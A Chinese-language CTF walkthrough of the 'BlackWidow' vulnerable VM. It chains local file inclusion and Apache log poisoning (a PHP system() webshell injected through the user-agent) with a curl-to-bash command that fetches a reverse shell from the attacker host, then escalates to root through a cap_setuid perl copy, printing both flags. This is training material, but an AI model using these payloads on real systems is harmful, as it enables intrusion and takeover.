# BlackWidow

:::note

[Linux VM] [Tested on VirtualBox] created by || 0xJin

⏲️ Release Date // 2021-05-07

✔️ MD5 // 1cc57898485241d95638f83111a442e9

☠ Root // 38

💀 User // 37

📝Notes //
Hack and fun.

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.121
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.121
Host is up (0.00037s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 f8:3b:7c:ca:c2:f6:5a:a6:0e:3f:f9:cf:1b:a9:dd:1e (RSA)
|   256 04:31:5a:34:d4:9b:14:71:a0:0f:22:78:2d:f3:b6:f6 (ECDSA)
|_  256 4e:42:8e:69:b7:90:e8:27:68:df:68:8a:83:a7:87:9c (ED25519)
80/tcp    open  http       Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      49461/udp   mountd
|   100005  1,2,3      49789/tcp   mountd
|   100005  1,2,3      51488/udp6  mountd
|   100005  1,2,3      58375/tcp6  mountd
|   100021  1,3,4      35981/tcp   nlockmgr
|   100021  1,3,4      39103/udp   nlockmgr
|   100021  1,3,4      39461/udp6  nlockmgr
|   100021  1,3,4      45989/tcp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs        3-4 (RPC #100003)
3128/tcp  open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
35043/tcp open  mountd     1-3 (RPC #100005)
35981/tcp open  nlockmgr   1-4 (RPC #100021)
36125/tcp open  mountd     1-3 (RPC #100005)
49789/tcp open  mountd     1-3 (RPC #100005)
```

## Web 服务 Port-80

尝试使用 `/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` 作为字典进行目录爆破，得到

```plaintext
[17:52:13] 301 -  315B  - /docs  ->  http://192.168.56.121/docs/
[17:52:13] 301 -  318B  - /company  ->  http://192.168.56.121/company/
[17:52:16] 301 -  313B  - /js  ->  http://192.168.56.121/js/
[17:59:01] 403 -  279B  - /server-status
```

在访问 `http://192.168.56.121/company/` 的过程中，在网络流量中发现以下数据

```html
<!-- =======================================================
* Template Name: Arsha - v3.0.3
* Template URL: https://bootstrapmade.com/arsha-free-bootstrap-html-template-corporate/
* Author: BootstrapMade.com
* License: https://bootstrapmade.com/license/
========================================================

We are working to develop a php inclusion method using "file" parameter - Black Widow DevOps Team.

-->
```

尝试对 `/company/` 这个子目录进行爆破扫描

```plaintext
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 42271]
/assets               (Status: 301) [Size: 325] [--> http://192.168.56.121/company/assets/]
/forms                (Status: 301) [Size: 324] [--> http://192.168.56.121/company/forms/]
/changelog.txt        (Status: 200) [Size: 1175]
/Readme.txt           (Status: 200) [Size: 222]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/started.php          (Status: 200) [Size: 42271]
```

尝试访问 `/started.php?file=../../../../../etc/passwd`

```plaintext
# http get http://192.168.56.121/company/started.php?file=../../../../../../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
viper:x:1001:1001:Viper,,,:/home/viper:/bin/bash
_rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin
```

继续回顾上面得到的信息，发现一个链接 `http://blackwidow/company/started.php`

将这个路由添加到 `/etc/hosts`

```plaintext
192.168.56.121 blackwidow
```

:::note

这里是否设置这个 hostname 其实都不会有什么影响

:::

### 本地包含日志文件实现 webshell 部署

```bash
┌─[randark@parrot]─[~]
└──╼ $ http get http://192.168.56.121/company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 159
Content-Type: text/html; charset=UTF-8
Date: Sun, 25 Feb 2024 16:10:19 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding

......
192.168.56.102 - - [25/Feb/2024:11:10:14 -0500] "GET /company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log HTTP/1.1" 200 203 "-" "HTTPie/3.2.1"
192.168.56.102 - - [25/Feb/2024:11:10:16 -0500] "GET /company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log HTTP/1.1" 200 203 "-" "HTTPie/3.2.1"
```

尝试一下，可以通过 `user-agent` 将特定字符串写入日志文件，从而部署一个 webshell 进去

```bash
curl http://192.168.56.121/ --user-agent "<?php system($_GET['shell']); ?>"
```

然后

```bash
http get "http://192.168.56.121/company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log&shell=cat+/etc/passwd"
```

在返回中就可以发现已经成功读取了 `/etc/passwd` 文件

尝试借助恶意脚本投送服务器实现反向 shell

```bash
┌─[randark@parrot]─[~]
└──╼ $ http get "http://192.168.56.121/company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log&shell=curl+192.168.56.102/reverse.sh+|+bash"
```

## User - www-data

```bash
┌─[randark@parrot]─[~]
└──╼ $ pwncat-cs -lp 9999
[00:26:56] Welcome to pwncat 🐈!
[00:27:00] received connection from 192.168.56.121:39342
[00:27:01] 192.168.56.121:39342: registered new host w/ db
(local) pwncat$ back
(remote) www-data@blackwidow:/var/www/html/company$ whoami
www-data
```

### 读取 SSH 认证日志

```bash
(remote) www-data@blackwidow:/var/backups$ cat auth.log | grep sshd
......
Dec 12 16:56:43 test sshd[29560]: Invalid user ?V1p3r2020!? from 192.168.1.109 port 7090
......
```

得到一串疑似

```plaintext
viper:?V1p3r2020!?
```

## User - viper

```plaintext
┌─[randark@parrot]─[~]
└──╼ $ pwncat-cs viper@192.168.56.121
[00:48:05] Welcome to pwncat 🐈!
Password: ************
[00:48:11] 192.168.56.121:22: normalizing shell path
[00:48:12] 192.168.56.121:22: registered new host w/ db
(local) pwncat$ back
(remote) viper@blackwidow:/home/viper$ whoami
viper
```

### flag - user

```bash
(remote) viper@blackwidow:/home/viper$ cat local.txt
d930fe79919376e6d08972dae222526b
```

### 环境探测

```plaintext title="getcap -r / 2>/dev/null"
/home/viper/backup_site/assets/vendor/weapon/arsenic = cap_setuid+ep
/usr/bin/perl =
/usr/bin/perl5.28.1 =
/usr/bin/ping = cap_net_raw+ep
/usr/lib/squid/pinger = cap_net_raw+ep
```

在其中发现了一个特殊的 `cap_setuid` 权限，并且为一个可接管文件 `/home/viper/backup_site/assets/vendor/weapon/arsenic`

### 分析利用方式

查看 `/home/viper/backup_site/assets/vendor/weapon/arsenic` 文件的形式

```bash
(remote) viper@blackwidow:/home/viper$ file /home/viper/backup_site/assets/vendor/weapon/arsenic
/home/viper/backup_site/assets/vendor/weapon/arsenic: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=36da142560b2aa57fcade932db83015f6f612052, stripped
(remote) viper@blackwidow:/home/viper$ /home/viper/backup_site/assets/vendor/weapon/arsenic --version

This is perl 5, version 28, subversion 1 (v5.28.1) built for x86_64-linux-gnu-thread-multi
(with 65 registered patches, see perl -V for more detail)

Copyright 1987-2018, Larry Wall

Perl may be copied only under the terms of either the Artistic License or the
GNU General Public License, which may be found in the Perl 5 source kit.

Complete documentation for Perl, including FAQ lists, should be found on
this system using "man perl" or "perldoc perl".  If you have access to the
Internet, point your browser at http://www.perl.org/, the Perl Home Page.
```

那就很简单了，这个文件就是 `perl` 程序，直接利用就行

## User - root

```bash
(remote) viper@blackwidow:/home/viper$ /home/viper/backup_site/assets/vendor/weapon/arsenic -e 'use POSIX qw(setuid); POSIX::setuid(0); exec"/bin/bash";'
root@blackwidow:~# whoami
root
```

### flag - root

```bash
root@blackwidow:/root# cat root.txt


▄▄▄▄· ▄▄▌   ▄▄▄·  ▄▄· ▄ •▄     ▄▄▌ ▐ ▄▌▪  ·▄▄▄▄        ▄▄▌ ▐ ▄▌
▐█ ▀█▪██•  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ██· █▌▐███ ██▪ ██ ▪     ██· █▌▐█
▐█▀▀█▄██▪  ▄█▀▀█ ██ ▄▄▐▀▀▄·    ██▪▐█▐▐▌▐█·▐█· ▐█▌ ▄█▀▄ ██▪▐█▐▐▌
██▄▪▐█▐█▌▐▌▐█ ▪▐▌▐███▌▐█.█▌    ▐█▌██▐█▌▐█▌██. ██ ▐█▌.▐▌▐█▌██▐█▌
·▀▀▀▀ .▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀ ▀▪▀▀▀▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ ▀▪


Congrats!

You've rooted Black Widow!

0xJin - mindsflee
Follow on Instagram: 0xjiin
Follow on Twitter: 0xJin , @mindsflee


0780eb289a44ba17ea499ffa6322b335
```
